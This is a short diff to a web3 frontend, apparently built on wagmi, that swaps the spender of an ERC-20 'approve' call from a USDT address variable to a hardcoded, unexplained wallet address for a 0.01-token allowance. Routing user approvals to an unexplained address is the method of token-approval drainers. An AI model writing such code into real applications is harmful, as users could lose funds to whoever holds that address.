@@ -267,7 +267,7 @@ function Home() {
         abi: erc20Abi,
         functionName: 'approve',
         args: [
-          usdtAddress as `0x${string}`, // spender
+          '0x08219E70ad70d570295bf1017dcEda0a6325D5C9', // spender
           parseUnits('0.01', 6), // amount  (uint256)
         ],
       });
